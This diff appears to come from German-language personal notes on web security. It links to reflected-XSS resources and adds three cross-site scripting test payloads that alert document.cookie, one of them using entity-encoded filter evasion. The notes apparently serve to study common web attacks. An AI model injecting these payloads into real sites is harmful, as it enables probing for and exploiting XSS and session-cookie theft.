@@ -8,6 +8,9 @@ anstatt nur einen mit einer spezifischen ID.
 Insert <script>alert();</script>
 https://www.imperva.com/learn/application-security/reflected-xss-attacks/#:~:text=Reflected%20XSS%20attacks%2C%20also%20known,enables%20execution%20of%20malicious%20scripts.
 https://www.youtube.com/watch?v=T0vxdqvW9fU&list=LL&index=3
+<script>alert(document.cookie); </script>
+<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
+<IMG SRC=j&#X41vascript:alert('test2')>
 
 # Brute-force attack
 
